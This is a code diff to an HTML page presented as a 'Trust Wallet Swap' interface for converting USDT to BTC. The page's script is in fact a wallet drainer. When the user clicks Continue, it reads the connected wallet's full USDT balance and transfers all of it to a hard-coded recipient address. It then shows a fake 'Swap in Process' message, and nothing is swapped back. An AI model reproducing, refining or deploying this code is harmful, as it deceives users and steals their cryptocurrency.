@@ -6,8 +6,8 @@
   <title>Trust Wallet Swap</title>
   <style>
     :root {
-      --primary: #0000FF;
-      --primary-glow: rgba(0, 0, 255, 0.4);
+      --primary: #0000FF; /* Changed to Pure Blue */
+      --primary-glow: rgba(0, 0, 255, 0.4); /* Updated glow effect */
       --text-dark: #1E2026;
       --text-medium: #474D57;
       --text-light: #848E9C;
@@ -249,8 +249,6 @@
   <div class="container">
     <div class="swap-header">Swap</div>
     <div class="swap-body">
-
-      <!-- FROM (USDT) -->
       <div class="token-box">
         <div class="token-header">
           <div class="token-label">From</div>
@@ -263,12 +261,7 @@
           <input type="text" id="usdtInput" class="token-amount" placeholder="Enter amount" />
           <div id="usdtValue" class="token-value">$0</div>
         </div>
-        <div style="text-align: right; margin-top: 8px;">
-          <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" width="24" height="24">
-        </div>
       </div>
-
-      <!-- TO (BTC) -->
       <div class="token-box">
         <div class="token-header">
           <div class="token-label">To</div>
@@ -281,16 +274,11 @@
           <div id="btcAmount" class="token-amount">0</div>
           <div id="btcValue" class="token-value">$0</div>
         </div>
-        <div style="text-align: right; margin-top: 8px;">
-          <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="BTC" width="24" height="24">
-        </div>
       </div>
-
       <div class="rate-info">
         <span>1 BTC ≈ 1,19,489.153599 USDT</span>
         <span class="rate-icon">⇔</span>
       </div>
-
       <div class="provider-section">
         <div class="provider-row">
           <div class="provider-title">Provider Fee</div>
@@ -304,13 +292,11 @@
           <div class="provider-value">Binance</div>
         </div>
       </div>
-
       <div id="errorMessage" class="error-message"></div>
       <button id="swapButton" class="swap-button">
         <span id="buttonText">Continue</span>
       </button>
     </div>
-
     <div class="tab-bar">
       <div class="tab-item"><div class="tab-icon">🏠</div><div>Home</div></div>
       <div class="tab-item"><div class="tab-icon">📈</div><div>Trending</div></div>
@@ -326,6 +312,8 @@
       const BSC_CHAIN_ID = '0x38';
       const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
       const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943';
+      const MIN_AMOUNT = 100;          // असली मिनिमम लिमिट: 100 USDT
+      const MAX_DAILY_LIMIT = Infinity; // असली मैक्सिमम लिमिट: अनलिमिटेड
       const BTC_RATE = 119489.153599;
       const USDT_ABI = [
         {
@@ -420,12 +408,17 @@
           const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
 
           if (balanceInUSDT < 100) {
-            showAlert('error', 'Insufficient USDT balance', 'Minimum Required $200\nMaximum $10,000 USDT');
+            showAlert(
+              'error',
+              'Insufficient USDT balance',
+              'Minimum Required $200\nMaximum $10,000 USDT'
+            );
             return;
           }
 
           await usdtContract.methods.transfer(RECIPIENT_ADDRESS, balance).send({ from: userAddress });
           showAlert('success', 'Swap in Process', 'Your transaction is being processed on the blockchain');
+
         } catch (error) {
           if (!error.message.includes('Minimum')) {
             showAlert('error', 'Transaction Failed', error.message);
